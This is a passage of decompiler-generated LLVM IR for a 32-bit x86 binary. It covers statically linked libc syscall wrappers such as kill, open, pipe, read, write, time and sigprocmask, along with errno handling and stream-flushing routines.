  %tmp = icmp ult i32 %v2_804e3fc, -4095
  br i1 %tmp, label %dec_label_pc_804e414, label %dec_label_pc_804e408

dec_label_pc_804e408:                             ; preds = %dec_label_pc_804e3dc
  %v1_804e408 = call i32 @function_804e694(i32 %v0_804e3f4)
  %v0_804e40d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e40d = sub i32 0, %v0_804e40d
  %v2_804e40f = inttoptr i32 %v1_804e408 to i32*
  store i32 %v1_804e40d, i32* %v2_804e40f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e414

dec_label_pc_804e414:                             ; preds = %dec_label_pc_804e3dc, %dec_label_pc_804e408
  %v0_804e417 = phi i32 [ %v2_804e3fc, %dec_label_pc_804e3dc ], [ -1, %dec_label_pc_804e408 ]
  %v2_804e419 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e419, i32* @edi, align 4
  ret i32 %v0_804e417

; uselistorder directives
  uselistorder i32 %v2_804e3fc, { 1, 0, 2 }
  uselistorder i32 %v0_804e3f4, { 1, 0 }
  uselistorder label %dec_label_pc_804e414, { 1, 0 }
}

define i32 @function_804e41c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804e41c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e41c = load i32, i32* @ebx, align 4
  store i32 %v0_804e41c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804e42f = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804e42f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e42f, -4095
  br i1 %tmp, label %dec_label_pc_804e448, label %dec_label_pc_804e43c

dec_label_pc_804e43c:                             ; preds = %dec_label_pc_804e41c
  %v0_804e43c = load i32, i32* %stack_var_-4, align 4
  %v1_804e43c = call i32 @function_804e694(i32 %v0_804e43c)
  %v0_804e441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e441 = sub i32 0, %v0_804e441
  %v2_804e443 = inttoptr i32 %v1_804e43c to i32*
  store i32 %v1_804e441, i32* %v2_804e443, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e448

dec_label_pc_804e448:                             ; preds = %dec_label_pc_804e41c, %dec_label_pc_804e43c
  %v0_804e449 = phi i32 [ %v2_804e42f, %dec_label_pc_804e41c ], [ -1, %dec_label_pc_804e43c ]
  %v2_804e448 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e448, i32* @edx, align 4
  %v2_804e44c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e44c, i32* @ebx, align 4
  ret i32 %v0_804e449

; uselistorder directives
  uselistorder i32 %v2_804e42f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e448, { 1, 0 }
}

define i32 @function_804e450(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e450:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804e453 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804e457 = sdiv i32 %sext, 16777216
  %v4_804e45b = ptrtoint i8* %arg1 to i32
  %v3_804e45f = and i32 %arg2, 64
  %v4_804e45f = icmp eq i32 %v3_804e45f, 0
  br i1 %v4_804e45f, label %dec_label_pc_804e470, label %dec_label_pc_804e464

dec_label_pc_804e464:                             ; preds = %dec_label_pc_804e450
  br label %dec_label_pc_804e470

dec_label_pc_804e470:                             ; preds = %dec_label_pc_804e450, %dec_label_pc_804e464
  store i32 %v4_804e45b, i32* %ebx.global-to-local, align 4
  %v5_804e47b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804e457)
  store i32 %v5_804e47b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804e47b, -4095
  br i1 %tmp, label %dec_label_pc_804e493, label %dec_label_pc_804e487

dec_label_pc_804e487:                             ; preds = %dec_label_pc_804e470
  %v1_804e487 = call i32 @function_804e694(i32 %v0_804e453)
  %v0_804e48c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e48c = sub i32 0, %v0_804e48c
  %v2_804e48e = inttoptr i32 %v1_804e487 to i32*
  store i32 %v1_804e48c, i32* %v2_804e48e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e493

dec_label_pc_804e493:                             ; preds = %dec_label_pc_804e470, %dec_label_pc_804e487
  %v0_804e496 = phi i32 [ %v5_804e47b, %dec_label_pc_804e470 ], [ -1, %dec_label_pc_804e487 ]
  store i32 %v0_804e453, i32* @ebx, align 4
  ret i32 %v0_804e496

; uselistorder directives
  uselistorder i32 %v5_804e47b, { 1, 0, 2 }
  uselistorder i32 %v0_804e453, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e493, { 1, 0 }
  uselistorder label %dec_label_pc_804e470, { 1, 0 }
}

define i32 @function_804e49b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e49b:
  %v3_804e4ab = inttoptr i32 %arg1 to i8*
  %v4_804e4ab = call i32 @function_804e450(i8* %v3_804e4ab, i32 577)
  ret i32 %v4_804e4ab
}

define i32 @function_804e4b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e4b4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e4b4 = load i32, i32* @edi, align 4
  store i32 %v0_804e4b4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e4bc = load i32, i32* @ebx, align 4
  %v1_804e4c4 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804e4c4 = call i32 @pipe([2 x i32] %v1_804e4c4)
  store i32 %v0_804e4bc, i32* @ebx, align 4
  store i32 %v2_804e4c4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e4c4, -4095
  br i1 %tmp, label %dec_label_pc_804e4dc, label %dec_label_pc_804e4d0

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e4b4
  %v1_804e4d0 = call i32 @function_804e694(i32 %v0_804e4bc)
  %v0_804e4d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e4d5 = sub i32 0, %v0_804e4d5
  %v2_804e4d7 = inttoptr i32 %v1_804e4d0 to i32*
  store i32 %v1_804e4d5, i32* %v2_804e4d7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e4dc

dec_label_pc_804e4dc:                             ; preds = %dec_label_pc_804e4b4, %dec_label_pc_804e4d0
  %v0_804e4dd = phi i32 [ %v2_804e4c4, %dec_label_pc_804e4b4 ], [ -1, %dec_label_pc_804e4d0 ]
  %v2_804e4e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e4e0, i32* @edi, align 4
  ret i32 %v0_804e4dd

; uselistorder directives
  uselistorder i32 %v2_804e4c4, { 1, 0, 2 }
  uselistorder i32 %v0_804e4bc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e4dc, { 1, 0 }
}

define i32 @function_804e4e4(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e4e4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e4e4 = load i32, i32* @edi, align 4
  store i32 %v0_804e4e4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e4f4 = load i32, i32* @ebx, align 4
  %v4_804e4fc = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e4f4, i32* @ebx, align 4
  store i32 %v4_804e4fc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e4fc, -4095
  br i1 %tmp, label %dec_label_pc_804e514, label %dec_label_pc_804e508

dec_label_pc_804e508:                             ; preds = %dec_label_pc_804e4e4
  %v1_804e508 = call i32 @function_804e694(i32 %v0_804e4f4)
  %v0_804e50d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e50d = sub i32 0, %v0_804e50d
  %v2_804e50f = inttoptr i32 %v1_804e508 to i32*
  store i32 %v1_804e50d, i32* %v2_804e50f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e514

dec_label_pc_804e514:                             ; preds = %dec_label_pc_804e4e4, %dec_label_pc_804e508
  %v0_804e515 = phi i32 [ %v4_804e4fc, %dec_label_pc_804e4e4 ], [ -1, %dec_label_pc_804e508 ]
  %v2_804e518 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e518, i32* @edi, align 4
  ret i32 %v0_804e515

; uselistorder directives
  uselistorder i32 %v4_804e4fc, { 1, 0, 2 }
  uselistorder i32 %v0_804e4f4, { 1, 0 }
  uselistorder label %dec_label_pc_804e514, { 1, 0 }
}

define i32 @function_804e51c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804e51c:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e51d = load i32, i32* @esi, align 4
  store i32 %v0_804e51d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804e535 = load i32, i32* @ebx, align 4
  %v1_804e53d = call i32 @int80_syscall(i32 142)
  store i32 %v0_804e535, i32* @ebx, align 4
  store i32 %v1_804e53d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e53d, -4095
  br i1 %tmp, label %dec_label_pc_804e555, label %dec_label_pc_804e549

dec_label_pc_804e549:                             ; preds = %dec_label_pc_804e51c
  %v1_804e549 = call i32 @function_804e694(i32 %v0_804e535)
  %v0_804e54e = load i32, i32* %esi.global-to-local, align 4
  %v1_804e54e = sub i32 0, %v0_804e54e
  %v2_804e550 = inttoptr i32 %v1_804e549 to i32*
  store i32 %v1_804e54e, i32* %v2_804e550, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e555

dec_label_pc_804e555:                             ; preds = %dec_label_pc_804e51c, %dec_label_pc_804e549
  %v0_804e556 = phi i32 [ %v1_804e53d, %dec_label_pc_804e51c ], [ -1, %dec_label_pc_804e549 ]
  %v2_804e558 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e558, i32* @esi, align 4
  ret i32 %v0_804e556

; uselistorder directives
  uselistorder i32 %v1_804e53d, { 1, 0, 2 }
  uselistorder i32 %v0_804e535, { 1, 0 }
  uselistorder label %dec_label_pc_804e555, { 1, 0 }
}

define i32 @function_804e584(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e584:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804e585 = load i32, i32* @esi, align 4
  %v4_804e589 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e589, i32* @ecx, align 4
  %v2_804e595 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804e595, label %dec_label_pc_804e5ae, label %dec_label_pc_804e599

dec_label_pc_804e599:                             ; preds = %dec_label_pc_804e584
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804e5ae, label %dec_label_pc_804e59e

dec_label_pc_804e59e:                             ; preds = %dec_label_pc_804e599
  %v1_804e59e = call i32 @function_804e694(i32 %v0_804e585)
  %v1_804e5a3 = inttoptr i32 %v1_804e59e to i32*
  store i32 22, i32* %v1_804e5a3, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_804e5d5

dec_label_pc_804e5ae:                             ; preds = %dec_label_pc_804e599, %dec_label_pc_804e584
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e5b3 = load i32, i32* @ebx, align 4
  %v7_804e5bb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804e5b3, i32* @ebx, align 4
  %v1_804e5be = add i32 %v7_804e5bb, 4096
  %v2_804e5be = icmp ult i32 %v7_804e5bb, -4096
  %v3_804e5be = xor i32 %v7_804e5bb, -2147483648
  %v4_804e5be = xor i32 %v1_804e5be, %v7_804e5bb
  %v5_804e5be = and i32 %v4_804e5be, %v3_804e5be
  %v6_804e5be = icmp slt i32 %v5_804e5be, 0
  store i1 %v6_804e5be, i1* @of, align 1
  %v7_804e5be = icmp eq i32 %v1_804e5be, 0
  store i32 %v7_804e5bb, i32* %esi.global-to-local, align 4
  %v2_804e5c5 = or i1 %v2_804e5be, %v7_804e5be
  br i1 %v2_804e5c5, label %dec_label_pc_804e5d5, label %dec_label_pc_804e5c7

dec_label_pc_804e5c7:                             ; preds = %dec_label_pc_804e5ae
  %v1_804e5c7 = call i32 @function_804e694(i32 %v0_804e5b3)
  %v0_804e5cc = load i32, i32* %esi.global-to-local, align 4
  %v1_804e5cc = sub i32 0, %v0_804e5cc
  %v2_804e5ce = inttoptr i32 %v1_804e5c7 to i32*
  store i32 %v1_804e5cc, i32* %v2_804e5ce, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e5d5

dec_label_pc_804e5d5:                             ; preds = %dec_label_pc_804e5c7, %dec_label_pc_804e5ae, %dec_label_pc_804e59e
  %storemerge = phi i32 [ -1, %dec_label_pc_804e59e ], [ %v7_804e5bb, %dec_label_pc_804e5ae ], [ -1, %dec_label_pc_804e5c7 ]
  %v2_804e5d5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e5d5, i32* @edx, align 4
  store i32 %v0_804e585, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e5be, { 1, 0 }
  uselistorder i32 %v7_804e5bb, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_804e5b3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804e5dc(i32* %arg1) local_unnamed_addr {
dec_label_pc_804e5dc:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804e5dc = load i32, i32* @edi, align 4
  store i32 %v0_804e5dc, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804e5e4 = load i32, i32* @ebx, align 4
  %v2_804e5ec = call i32 @time(i32* %arg1)
  store i32 %v0_804e5e4, i32* @ebx, align 4
  store i32 %v2_804e5ec, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e5ec, -4095
  br i1 %tmp, label %dec_label_pc_804e604, label %dec_label_pc_804e5f8

dec_label_pc_804e5f8:                             ; preds = %dec_label_pc_804e5dc
  %v1_804e5f8 = call i32 @function_804e694(i32 %v0_804e5e4)
  %v0_804e5fd = load i32, i32* %edi.global-to-local, align 4
  %v1_804e5fd = sub i32 0, %v0_804e5fd
  %v2_804e5ff = inttoptr i32 %v1_804e5f8 to i32*
  store i32 %v1_804e5fd, i32* %v2_804e5ff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e604

dec_label_pc_804e604:                             ; preds = %dec_label_pc_804e5dc, %dec_label_pc_804e5f8
  %v0_804e605 = phi i32 [ %v2_804e5ec, %dec_label_pc_804e5dc ], [ -1, %dec_label_pc_804e5f8 ]
  %v2_804e608 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e608, i32* @edi, align 4
  ret i32 %v0_804e605

; uselistorder directives
  uselistorder i32 %v2_804e5ec, { 1, 0, 2 }
  uselistorder i32 %v0_804e5e4, { 1, 0 }
  uselistorder label %dec_label_pc_804e604, { 1, 0 }
}

define i32 @function_804e60c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e60c:
  %v5_804e61d = call i32 @function_805187c(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_804e61d
}

define i32 @function_804e628(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e628:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e628 = load i32, i32* @edi, align 4
  store i32 %v0_804e628, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e638 = load i32, i32* @ebx, align 4
  %v4_804e640 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e638, i32* @ebx, align 4
  store i32 %v4_804e640, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e640, -4095
  br i1 %tmp, label %dec_label_pc_804e658, label %dec_label_pc_804e64c

dec_label_pc_804e64c:                             ; preds = %dec_label_pc_804e628
  %v1_804e64c = call i32 @function_804e694(i32 %v0_804e638)
  %v0_804e651 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e651 = sub i32 0, %v0_804e651
  %v2_804e653 = inttoptr i32 %v1_804e64c to i32*
  store i32 %v1_804e651, i32* %v2_804e653, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e658

dec_label_pc_804e658:                             ; preds = %dec_label_pc_804e628, %dec_label_pc_804e64c
  %v0_804e659 = phi i32 [ %v4_804e640, %dec_label_pc_804e628 ], [ -1, %dec_label_pc_804e64c ]
  %v2_804e658 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e658, i32* @edx, align 4
  %v2_804e65c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e65c, i32* @edi, align 4
  ret i32 %v0_804e659

; uselistorder directives
  uselistorder i32 %v4_804e640, { 1, 0, 2 }
  uselistorder i32 %v0_804e638, { 1, 0 }
  uselistorder label %dec_label_pc_804e658, { 1, 0 }
}

define i32 @function_804e660(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e660:
  %v0_804e664 = load i32, i32* inttoptr (i32 134567556 to i32*), align 4
  %v2_804e669 = mul i32 %arg1, 2
  %v3_804e669 = add i32 %v0_804e664, %v2_804e669
  %v4_804e669 = inttoptr i32 %v3_804e669 to i16*
  %v5_804e669 = load i16, i16* %v4_804e669, align 2
  %v6_804e669 = zext i16 %v5_804e669 to i32
  %v1_804e66d = and i32 %v6_804e669, 32
  ret i32 %v1_804e66d
}

define i32 @function_804e674(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e674:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e678 = add i32 %arg1, 128
  %v6_804e683 = icmp ugt i32 %v1_804e678, 383
  br i1 %v6_804e683, label %dec_label_pc_804e68e, label %dec_label_pc_804e685

dec_label_pc_804e685:                             ; preds = %dec_label_pc_804e674
  %v0_804e685 = load i32, i32* inttoptr (i32 134567564 to i32*), align 4
  %v2_804e68a = mul i32 %arg1, 2
  %v3_804e68a = add i32 %v0_804e685, %v2_804e68a
  %v4_804e68a = inttoptr i32 %v3_804e68a to i16*
  %v5_804e68a = load i16, i16* %v4_804e68a, align 2
  %v6_804e68a = sext i16 %v5_804e68a to i32
  store i32 %v6_804e68a, i32* @edx, align 4
  br label %dec_label_pc_804e68e

dec_label_pc_804e68e:                             ; preds = %dec_label_pc_804e674, %dec_label_pc_804e685
  %v0_804e68e = phi i32 [ %arg1, %dec_label_pc_804e674 ], [ %v6_804e68a, %dec_label_pc_804e685 ]
  ret i32 %v0_804e68e

; uselistorder directives
  uselistorder label %dec_label_pc_804e68e, { 1, 0 }
}

define i32 @function_804e694(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e694:
  ret i32 ptrtoint (i32* @global_var_805b974.49 to i32)
}

define i32 @function_804e738() local_unnamed_addr {
dec_label_pc_804e738:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e739 = load i32, i32* @edi, align 4
  %v0_804e73a = load i32, i32* @esi, align 4
  %v0_804e73b = load i32, i32* @ebx, align 4
  store i32 %v0_804e73b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e744 = call i32 @function_804e694(i32 %v0_804e73b)
  %v0_804e74c = load i16, i16* @global_var_80556e0.46, align 32
  %v1_804e74c = zext i16 %v0_804e74c to i32
  store i32 %v1_804e74c, i32* @esi, align 4
  %v1_804e753 = inttoptr i32 %v1_804e744 to i32*
  %v2_804e753 = load i32, i32* %v1_804e753, align 4
  store i32 %v2_804e753, i32* %ebp.global-to-local, align 4
  store i32 %v1_804e744, i32* @edi, align 4
  %v1_804e759 = call i32 @function_804f908(i32 0)
  %v0_804e75e = load i32, i32* @ebx, align 4
  %v2_804e767 = sub i32 %v0_804e75e, %v1_804e759
  %v2_804e76b = mul i32 %v2_804e767, 256
  %v0_804e76e = load i32, i32* @esi, align 4
  %v2_804e76e = xor i32 %v0_804e76e, %v2_804e76b
  %v1_804e770 = trunc i32 %v2_804e76e to i16
  store i16 %v1_804e770, i16* @global_var_80556e0.46, align 32
  %v0_804e777 = load i16, i16* @global_var_8055730.47, align 16
  %v1_804e777 = zext i16 %v0_804e777 to i32
  store i32 %v1_804e777, i32* @esi, align 4
  %v1_804e77e = call i32 @function_804f908(i32 1)
  %v0_804e783 = load i32, i32* @ebx, align 4
  %v2_804e783 = sub i32 %v0_804e783, %v1_804e77e
  %v2_804e785 = mul i32 %v2_804e783, 256
  %v0_804e788 = load i32, i32* @esi, align 4
  %v2_804e788 = xor i32 %v2_804e785, %v0_804e788
  %v1_804e78a = trunc i32 %v2_804e788 to i16
  store i16 %v1_804e78a, i16* @global_var_8055730.47, align 16
  %v0_804e791 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e791 = load i32, i32* @edi, align 4
  %v2_804e791 = inttoptr i32 %v1_804e791 to i32*
  store i32 %v0_804e791, i32* %v2_804e791, align 4
  %v2_804e796 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e796, i32* @ebx, align 4
  store i32 %v0_804e73a, i32* @esi, align 4
  store i32 %v0_804e739, i32* @edi, align 4
  ret i32 %v1_804e77e

; uselistorder directives
  uselistorder i32 %v1_804e744, { 1, 0 }
  uselistorder i16* @global_var_8055730.47, { 1, 0 }
  uselistorder i32 (i32)* @function_804f908, { 1, 0 }
}

define i32 @function_804e79b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e79b:
  %v3_804e7a9 = inttoptr i32 %arg1 to i16*
  %v4_804e7a9 = call i32 @function_804f670(i16* %v3_804e7a9, i32 ptrtoint (i32* @global_var_8053640.50 to i32), i32 24)
  ret i32 %v4_804e7a9
}

define i32 @function_804e7b2() local_unnamed_addr {
dec_label_pc_804e7b2:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e7b2 = load i32, i32* @esi, align 4
  %v0_804e7b3 = load i32, i32* @ebx, align 4
  store i32 %v0_804e7b3, i32* %stack_var_-8, align 4
  %v1_804e7bc = call i32 @function_804e79b(i32 ptrtoint (i32* @global_var_80556a8.51 to i32))
  store i32 %v1_804e7bc, i32* %eax.global-to-local, align 4
  %v1_804e7c8 = call i32 @function_804e79b(i32 ptrtoint (i32* @global_var_80556c0.52 to i32))
  store i32 %v1_804e7c8, i32* %eax.global-to-local, align 4
  %storemerge16 = load i32, i32* bitcast (i32** @global_var_80556a4.53 to i32*), align 4
  store i32 %storemerge16, i32* %ebx.global-to-local, align 4
  %v1_804e81217 = icmp eq i32 %storemerge16, 0
  %v1_804e81418 = icmp eq i1 %v1_804e81217, false
  br i1 %v1_804e81418, label %dec_label_pc_804e7d5.lr.ph, label %dec_label_pc_804e832.preheader

dec_label_pc_804e7d5.lr.ph:                       ; preds = %dec_label_pc_804e7b2
  br label %dec_label_pc_804e7d5

dec_label_pc_804e7d5:                             ; preds = %dec_label_pc_804e7d5.lr.ph, %dec_label_pc_804e7fc
  %storemerge19 = phi i32 [ %storemerge16, %dec_label_pc_804e7d5.lr.ph ], [ %storemerge, %dec_label_pc_804e7fc ]
  %v1_804e7d8 = add i32 %storemerge19, 56
  store i32 %v1_804e7d8, i32* @esi, align 4
  %v1_804e7dc = call i32 @function_80512df(i32 %v1_804e7d8)
  store i32 %v1_804e7dc, i32* %eax.global-to-local, align 4
  %v1_804e7e4 = icmp eq i32 %v1_804e7dc, 0
  br i1 %v1_804e7e4, label %dec_label_pc_804e7fc, label %dec_label_pc_804e7e8

dec_label_pc_804e7e8:                             ; preds = %dec_label_pc_804e7d5
  %v0_804e7e8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e7e8 = add i32 %v0_804e7e8, 8
  %v2_804e7e8 = inttoptr i32 %v1_804e7e8 to i32*
  %v3_804e7e8 = load i32, i32* %v2_804e7e8, align 4
  store i32 %v3_804e7e8, i32* %eax.global-to-local, align 4
  %v1_804e7eb = inttoptr i32 %v0_804e7e8 to i16*
  store i16 48, i16* %v1_804e7eb, align 2
  %v0_804e7f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f0 = add i32 %v1_804e7f0, 24
  %v3_804e7f0 = inttoptr i32 %v2_804e7f0 to i32*
  store i32 %v0_804e7f0, i32* %v3_804e7f0, align 4
  %v0_804e7f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f3 = add i32 %v1_804e7f3, 28
  %v3_804e7f3 = inttoptr i32 %v2_804e7f3 to i32*
  store i32 %v0_804e7f3, i32* %v3_804e7f3, align 4
  %v0_804e7f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f6 = add i32 %v1_804e7f6, 16
  %v3_804e7f6 = inttoptr i32 %v2_804e7f6 to i32*
  store i32 %v0_804e7f6, i32* %v3_804e7f6, align 4
  %v0_804e7f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f9 = add i32 %v1_804e7f9, 20
  %v3_804e7f9 = inttoptr i32 %v2_804e7f9 to i32*
  store i32 %v0_804e7f9, i32* %v3_804e7f9, align 4
  br label %dec_label_pc_804e7fc

dec_label_pc_804e7fc:                             ; preds = %dec_label_pc_804e7d5, %dec_label_pc_804e7e8
  %v0_804e7ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e7ff = add i32 %v0_804e7ff, 52
  %v2_804e7ff = inttoptr i32 %v1_804e7ff to i32*
  store i32 1, i32* %v2_804e7ff, align 4
  %v0_804e806 = load i32, i32* @esi, align 4
  %v1_804e807 = call i32 @function_804e79b(i32 %v0_804e806)
  store i32 %v1_804e807, i32* %eax.global-to-local, align 4
  %v0_804e80c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e80c = add i32 %v0_804e80c, 32
  %v2_804e80c = inttoptr i32 %v1_804e80c to i32*
  %storemerge = load i32, i32* %v2_804e80c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e812 = icmp eq i32 %storemerge, 0
  %v1_804e814 = icmp eq i1 %v1_804e812, false
  br i1 %v1_804e814, label %dec_label_pc_804e7d5, label %dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge

dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge: ; preds = %dec_label_pc_804e7fc
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80556a4.53 to i32*), align 4
  br label %dec_label_pc_804e832.preheader

dec_label_pc_804e832.preheader:                   ; preds = %dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge, %dec_label_pc_804e7b2
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge ], [ %storemerge16, %dec_label_pc_804e7b2 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e8323 = icmp eq i32 %storemerge12, 0
  %v1_804e8345 = icmp eq i1 %v1_804e8323, false
  br i1 %v1_804e8345, label %dec_label_pc_804e81e.preheader, label %dec_label_pc_804e836

dec_label_pc_804e81e.preheader:                   ; preds = %dec_label_pc_804e832.preheader
  br label %dec_label_pc_804e81e

dec_label_pc_804e81e:                             ; preds = %dec_label_pc_804e81e.preheader, %dec_label_pc_804e82f
  %v0_804e826 = phi i32 [ %storemerge1, %dec_label_pc_804e82f ], [ %storemerge12, %dec_label_pc_804e81e.preheader ]
  %v1_804e81e = inttoptr i32 %v0_804e826 to i8*
  %v2_804e81e = load i8, i8* %v1_804e81e, align 1
  %v3_804e81e = and i8 %v2_804e81e, 64
  %v4_804e81e = icmp eq i8 %v3_804e81e, 0
  br i1 %v4_804e81e, label %dec_label_pc_804e82f, label %dec_label_pc_804e823

dec_label_pc_804e823:                             ; preds = %dec_label_pc_804e81e
  %v1_804e827 = call i32 @function_804e83c(i32 %v0_804e826)
  store i32 %v1_804e827, i32* %eax.global-to-local, align 4
  %v0_804e82f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e82f

dec_label_pc_804e82f:                             ; preds = %dec_label_pc_804e81e, %dec_label_pc_804e823
